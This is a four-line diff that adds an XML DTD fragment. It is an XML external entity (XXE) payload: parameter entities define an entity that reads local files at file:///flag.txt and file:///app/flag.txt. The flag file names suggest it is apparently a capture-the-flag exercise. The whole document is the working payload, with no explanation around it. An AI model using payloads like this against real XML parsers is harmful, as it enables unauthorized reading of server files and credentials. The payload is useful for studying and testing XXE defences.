@@ -1,0 +1,4 @@
+<!ENTITY % payload "<!ENTITY aaa SYSTEM 'file:///flag.txt'>">
+<!ENTITY % payload2 "<!ENTITY aaa SYSTEM 'file:///app/flag.txt'>">
+%payload;
+%payload2;
